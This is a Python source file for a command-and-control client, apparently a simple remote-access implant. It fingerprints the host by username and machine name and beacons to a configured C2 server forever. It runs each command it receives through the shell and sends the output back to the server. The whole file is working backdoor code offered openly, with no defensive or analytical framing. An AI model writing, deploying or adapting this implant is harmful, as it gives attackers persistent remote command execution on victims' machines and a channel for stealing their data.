# Command and Control client Code

from os import chdir, getcwd, getenv
from subprocess import run, PIPE, STDOUT
from time import sleep, time
from requests import exceptions, get, post
from sys import platform
from os import uname
from settings import PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER

if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

def post_to_server(message: str, respone_path: str = RESPONSE):
    """ Function to post data to the c2 server. Accepts a message and a response path (optional) as arguments."""
    try:
        post(url=f"http://{C2_SERVER}:{PORT}{respone_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

# Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
while True:
    try:
        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)

        # If we get a 404 status code from server, raise an exception
        if response.status_code == 404:
            raise exceptions.RequestException(f"Server {C2_SERVER} returned a 404 status code")

    except exceptions.RequestException:
        sleep(DELAY)
        continue
    
    # Retrieve the command via the decoded content ot the response object
    command = response.content.decode()

    # If the command starts with "cd ", sliece out directory and chdir to it
    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"Directory {directory} not found")
        except NotADirectoryError:
            post_to_server(f"Directory {directory} is not a directory")
        except PermissionError:
            post_to_server(f"Permission denied to access directory {directory}")
        except OSError:
            post_to_server(f"Error accessing directory {directory}")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    # Else, run our operating system command and send the output to the c2
    else:
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output)

    print(response.status_code)
